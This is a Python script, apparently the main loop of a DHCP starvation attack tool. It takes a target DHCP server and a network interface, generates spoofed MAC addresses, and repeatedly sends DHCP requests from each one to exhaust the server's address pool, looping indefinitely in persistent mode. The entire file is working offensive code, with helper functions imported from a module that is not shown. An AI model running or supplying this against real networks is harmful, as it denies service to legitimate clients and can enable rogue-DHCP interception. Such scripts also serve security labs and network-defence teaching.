import sys
from time import sleep
from DHCP_Handling import *
import argparse


def main():
    parser = argparse.ArgumentParser(description='DHCP Starvation')
    parser.add_argument('-p', '--persist', help='persistant?', action='store_true')
    parser.add_argument('-i', '--iface', type=str, help='Interface you wish to use')
    parser.add_argument('-t', '--target', type=str, help='IP of target server')
    args = parser.parse_args()

    target_ip = args.target
    iface = args.iface
    persistent = args.persist

    # get list of spoofed mac adresses
    macs = get_list_of_spoofed_macs()
    # for each mac set the time that the last request sent
    macs_and_time = get_list_with_time(macs)

    print("starts the loop...\n")

    try:
        while True:
            for mac_and_time in macs_and_time:
                mac = mac_and_time[0]
                time = mac_and_time[1]
                print("handling " + mac + " ...\n")
                now = datetime.now()
                # if since last dhcp request passed 3 minutes
                if ((now - time).seconds >= 180):
                    #change_mac(iface, mac)
                    print("3 minutes passed!\n")
                    print('sending dhcp...\n')
                    is_succeed = send_dhcp_request(mac, target_ip, iface)
                    if is_succeed:
                        print('we got a new IP!\n')
                        mac_and_time[1] = now
            if not persistent:
                break
            sleep(10)
    except KeyboardInterrupt:
        print("ERROR")


if __name__ == "__main__":
    main()
